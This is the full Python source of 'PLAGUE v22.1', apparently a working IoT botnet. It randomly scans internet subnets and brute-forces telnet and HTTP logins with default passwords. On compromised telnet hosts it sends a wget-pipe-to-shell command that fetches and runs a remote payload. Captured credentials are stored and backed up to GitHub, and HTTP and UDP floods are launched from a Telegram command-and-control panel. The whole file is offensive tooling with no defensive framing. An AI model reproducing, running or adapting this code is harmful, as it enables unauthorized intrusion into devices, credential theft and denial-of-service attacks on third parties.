#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PLAGUE v22.1 – MEMORY OPTIMIZED
- Streamed HTTP responses (no full-body load)
- Strict concurrency limits (100 scan, 50 attack)
- Single shared aiohttp session, closed on stop
- Full Telegram control: start/stop/status/attack/backup/list
- Explicit resource cleanup (no dangling tasks)
"""

import asyncio
import aiohttp
import aiosqlite
import socket
import ipaddress
import random
import time
import json
import os
import sys
import base64
import logging
import hashlib
from typing import List, Dict, Optional
from datetime import datetime
from cryptography.fernet import Fernet
from pydantic_settings import BaseSettings
from logging.handlers import RotatingFileHandler

# ===================================================================
# 1. CONFIGURATION – TUNED FOR LOW MEMORY
# ===================================================================
class Settings(BaseSettings):
    bot_token: str
    admin_chat_id: str
    gh_pat: str
    encryption_key: str
    github_repo: str = ""

    # 🔽 VERY IMPORTANT: LOW CONCURRENCY TO PREVENT OOM
    scan_timeout: float = 2.0
    max_concurrent_scan: int = 100          # was 500
    max_concurrent_attack: int = 50         # was 250
    attack_jitter_min: float = 0.05
    attack_jitter_max: float = 0.2
    telegram_rate_limit_sec: float = 30.0
    max_scan_ips_per_subnet: int = 256      # was 1024

    class Config:
        env_file = ".env"
        env_file_encoding = "utf-8"

settings = Settings()

# ===================================================================
# 2. LOGGING (compact)
# ===================================================================
logger = logging.getLogger("PLAGUE")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(handler)
# No file handler to save disk I/O

# ===================================================================
# 3. ENCRYPTION
# ===================================================================
def get_cipher():
    hashed = hashlib.sha256(settings.encryption_key.encode()).digest()
    key = base64.urlsafe_b64encode(hashed)
    return Fernet(key)

cipher = get_cipher()
DB_FILE = "swarm.db"

# ===================================================================
# 4. DATABASE (with connection pool limit)
# ===================================================================
class Database:
    def __init__(self):
        self.pool = None
        self.lock = asyncio.Lock()
        self.initialized = False

    async def init(self):
        if self.initialized:
            return
        self.pool = await aiosqlite.connect(DB_FILE)
        await self.pool.execute("PRAGMA journal_mode=WAL")  # better concurrency
        await self.pool.execute("""
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                service TEXT,
                creds TEXT,
                arch TEXT,
                verified INTEGER DEFAULT 0,
                timestamp TEXT
            )
        """)
        await self.pool.commit()
        self.initialized = True
        logger.info("DB ready.")

    async def save_device(self, ip, port, service, creds, arch="", verified=True):
        if not self.initialized:
            await self.init()
        async with self.lock:
            async with self.pool.execute("SELECT id FROM devices WHERE ip=? AND port=?", (ip, port)) as cur:
                if await cur.fetchone():
                    return
            await self.pool.execute(
                "INSERT INTO devices (ip,port,service,creds,arch,verified,timestamp) VALUES (?,?,?,?,?,?,?)",
                (ip, port, service, creds, arch, 1 if verified else 0, datetime.now().isoformat())
            )
            await self.pool.commit()
            logger.info(f"CAPTURE {ip}:{port} [{service}] {creds}")

    async def get_devices(self, limit=999999):
        if not self.initialized:
            await self.init()
        async with self.pool.execute(
            "SELECT ip,port,service,creds,arch FROM devices WHERE verified=1 ORDER BY id DESC LIMIT ?", (limit,)
        ) as cur:
            rows = await cur.fetchall()
            return [{"ip":r[0],"port":r[1],"service":r[2],"creds":r[3],"arch":r[4]} for r in rows]

    async def close(self):
        if self.pool:
            await self.pool.close()
            self.initialized = False

db = Database()

# ===================================================================
# 5. GITHUB BACKUP (streamed encryption, low memory)
# ===================================================================
async def github_backup():
    try:
        devices = await db.get_devices()
        # Stream JSON to avoid large string
        payload = json.dumps(devices).encode()
        encrypted = cipher.encrypt(payload)
        content_b64 = base64.b64encode(encrypted).decode()

        headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
        async with aiohttp.ClientSession() as s:
            url = f"https://api.github.com/repos/{settings.github_repo}/contents/swarm.enc"
            body = {"message":"backup", "content":content_b64}
            async with s.get(url, headers=headers) as r:
                if r.status == 200:
                    body["sha"] = (await r.json()).get("sha")
            async with s.put(url, headers=headers, json=body) as r:
                if r.status in (200,201):
                    logger.info("Backup pushed.")
    except Exception as e:
        logger.error(f"Backup error: {e}")

# ===================================================================
# 6. PROXY POOL (minimal, no long-term storage)
# ===================================================================
PROXY_POOL = []
PROXY_LOCK = asyncio.Lock()

async def fetch_proxies():
    global PROXY_POOL
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000") as r:
                text = await r.text()
                raw = [f"http://{line.strip()}" for line in text.splitlines() if line.strip()][:30]
                async with PROXY_LOCK:
                    PROXY_POOL = raw
        logger.info(f"Proxies: {len(PROXY_POOL)}")
    except:
        pass

async def get_proxy():
    async with PROXY_LOCK:
        return random.choice(PROXY_POOL) if PROXY_POOL else None

# ===================================================================
# 7. PUBLIC IP (streamed)
# ===================================================================
async def get_public_ip(session):
    try:
        async with session.get("https://api.ipify.org?format=text", timeout=5) as r:
            return (await r.text()).strip()
    except:
        return "0.0.0.0"

# ===================================================================
# 8. SCANNER (low concurrency, streaming reads)
# ===================================================================
class Scanner:
    def __init__(self):
        self.sem = asyncio.Semaphore(settings.max_concurrent_scan)
        self.session = None
        self.running = True
        self.public_ip = "0.0.0.0"

    async def init(self):
        # Small connector pool → low memory
        conn = aiohttp.TCPConnector(limit=50, limit_per_host=5, ttl_dns_cache=60)
        self.session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=settings.scan_timeout))
        self.public_ip = await get_public_ip(self.session)
        logger.info(f"IP: {self.public_ip}")

    async def close(self):
        if self.session:
            await self.session.close()

    async def tcp_scan(self, ip, port):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
            w.close(); await w.wait_closed()
            return True
        except:
            return False

    async def telnet_brute(self, ip):
        creds = [("admin","admin"),("root","root"),("admin",""),("admin","password"),("root","admin")]
        for u,p in creds:
            try:
                r,w = await asyncio.wait_for(asyncio.open_connection(ip,23), timeout=3)
                try: await asyncio.wait_for(r.read(128), timeout=0.5)
                except: pass
                w.write(f"{u}\n".encode()); await w.drain(); await asyncio.sleep(0.2)
                d = await asyncio.wait_for(r.read(128), timeout=0.5)
                if b"assword" in d:
                    w.write(f"{p}\n".encode()); await w.drain(); await asyncio.sleep(0.3)
                    d = await asyncio.wait_for(r.read(256), timeout=1)
                    if any(b in d for b in [b"#",b"$",b">"]):
                        w.write(b"echo OK\n"); await w.drain(); await asyncio.sleep(0.2)
                        if b"OK" in await asyncio.wait_for(r.read(64), timeout=0.5):
                            await db.save_device(ip,23,"TELNET",f"{u}:{p}")
                            w.write(f"wget -qO- http://{self.public_ip}:8080/p.py | sh &\n".encode())
                            w.close(); await w.wait_closed()
                            return True
                w.close(); await w.wait_closed()
            except: continue
        return False

    async def http_brute(self, ip, port):
        creds = [("admin","admin"),("admin","password"),("root","root"),("admin","12345"),("admin","")]
        for u,p in creds:
            try:
                auth = aiohttp.BasicAuth(u,p)
                async with self.session.get(f"http://{ip}:{port}/", auth=auth, ssl=False, timeout=1.5) as resp:
                    if resp.status in (200,302,401):
                        # Stream-read only first 1KB to check keywords
                        chunk = await resp.content.read(1024)
                        text = chunk.decode(errors="ignore").lower()
                        if any(k in text for k in ["dashboard","logout","admin","camera"]):
                            await db.save_device(ip,port,"HTTP",f"{u}:{p}")
                            return True
            except: continue
        return False

    async def global_scan(self):
        logger.info("Scanner started (low‑memory mode).")
        while self.running:
            a = random.randint(1,223); b = random.randint(0,255); c = random.randint(0,255)
            net = f"{a}.{b}.{c}.0/24"
            ports = [23,80,443,8080,8000,37777,34567]
            tasks = []
            try:
                for ip in list(ipaddress.ip_network(net).hosts())[:settings.max_scan_ips_per_subnet]:
                    for port in ports:
                        tasks.append(self._probe(str(ip), port))
            except: continue
            for i in range(0, len(tasks), 50):   # small batches
                if not self.running: break
                await asyncio.gather(*tasks[i:i+50])
                await asyncio.sleep(0.2)
            await asyncio.sleep(0.5)

    async def _probe(self, ip, port):
        async with self.sem:
            if await self.tcp_scan(ip, port):
                if port == 23:
                    await self.telnet_brute(ip)
                elif port in (80,443,8080,8000,37777,34567):
                    await self.http_brute(ip, port)

# ===================================================================
# 9. ATTACK ENGINE (low concurrency, streamed)
# ===================================================================
class Attacker:
    def __init__(self, target, mode):
        self.target = target
        self.mode = mode
        self.active = asyncio.Event()
        self.active.set()
        self.sem = asyncio.Semaphore(settings.max_concurrent_attack)

    async def run(self, devices):
        if self.mode == "http":
            await self._http(devices)
        elif self.mode == "udp":
            await self._udp(devices)

    async def _http(self, devices):
        conn = aiohttp.TCPConnector(limit=20, force_close=True)
        async with aiohttp.ClientSession(connector=conn) as s:
            while self.active.is_set():
                tasks = []
                for _ in devices:
                    tasks.append(self._strike(s))
                for i in range(0, len(tasks), 20):
                    if not self.active.is_set(): break
                    await asyncio.gather(*tasks[i:i+20])
                    await asyncio.sleep(0.1)

    async def _strike(self, session):
        if not self.active.is_set(): return
        async with self.sem:
            try:
                proxy = await get_proxy()
                kw = {"timeout": aiohttp.ClientTimeout(total=1.5), "ssl": False}
                if proxy: kw["proxy"] = proxy
                async with session.get(self.target, **kw) as r:
                    await r.content.read(256)  # discard body
            except: pass

    async def _udp(self, devices):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        loop = asyncio.get_event_loop()
        ip, port = self.target.split(":"); port = int(port)
        while self.active.is_set():
            for _ in devices:
                try: await loop.sock_sendto(sock, b"Z"*1200, (ip, port))
                except: pass
            await asyncio.sleep(0.01)
        sock.close()

    def stop(self):
        self.active.clear()

# ===================================================================
# 10. TELEGRAM C2 (with start/stop/status)
# ===================================================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

class C2:
    def __init__(self, scanner):
        self.scanner = scanner
        self.app = None
        self.attacker = None
        self.last_msg = 0

    async def _reply(self, msg, text):
        if time.time() - self.last_msg > settings.telegram_rate_limit_sec:
            await msg.reply_text(text)
            self.last_msg = time.time()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        kb = [
            [InlineKeyboardButton("📊 Status", callback_data="status")],
            [InlineKeyboardButton("📋 List", callback_data="list")],
            [InlineKeyboardButton("💀 HTTP Flood", callback_data="atk_http")],
            [InlineKeyboardButton("🔥 UDP Flood", callback_data="atk_udp")],
            [InlineKeyboardButton("📦 Backup", callback_data="backup")],
            [InlineKeyboardButton("🛑 STOP", callback_data="stop")],
        ]
        await update.message.reply_text("PLAGUE v22.1 – Control Panel", reply_markup=InlineKeyboardMarkup(kb))

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query; await q.answer()
        if str(update.effective_user.id) != settings.admin_chat_id: return
        d = q.data

        if d == "status":
            devs = await db.get_devices()
            await q.edit_message_text(f"Army: {len(devs)} devices.\nScanner running: {self.scanner.running}")
        elif d == "list":
            devs = await db.get_devices(10)
            txt = "\n".join(f"{x['ip']}:{x['port']} | {x['creds']}" for x in devs)
            await q.edit_message_text(txt or "Empty.")
        elif d in ("atk_http","atk_udp"):
            context.user_data["mode"] = "http" if d=="atk_http" else "udp"
            await q.edit_message_text("Send target (URL or IP:PORT):")
        elif d == "backup":
            await q.edit_message_text("Backing up...")
            await github_backup()
            await q.edit_message_text("Done.")
        elif d == "stop":
            if self.attacker: self.attacker.stop()
            self.scanner.running = False
            await q.edit_message_text("All operations halted.")
            await context.application.stop_running()   # 🔥 stops the bot loop

    async def handle_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        mode = context.user_data.pop("mode", None)
        if not mode: return
        target = update.message.text.strip()
        devs = await db.get_devices()
        if not devs:
            await update.message.reply_text("No devices.")
            return
        self.attacker = Attacker(target, mode)
        asyncio.create_task(self.attacker.run(devs))
        await update.message.reply_text(f"{mode.upper()} flood started on {target} with {len(devs)} devices.")

    async def run(self):
        self.app = Application.builder().token(settings.bot_token).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CallbackQueryHandler(self.button))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_target))
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        logger.info("Bot online.")
        try:
            while True:
                await asyncio.sleep(3600)
        except asyncio.CancelledError:
            await self.app.stop()

# ===================================================================
# 11. MAIN (graceful, no leaks)
# ===================================================================
async def main():
    scanner = Scanner()
    await scanner.init()
    asyncio.create_task(fetch_proxies())
    scan_task = asyncio.create_task(scanner.global_scan())
    c2 = C2(scanner)
    await c2.run()
    # cleanup
    scanner.running = False
    scan_task.cancel()
    await scanner.close()
    await db.close()

if __name__ == "__main__":
    asyncio.run(main())
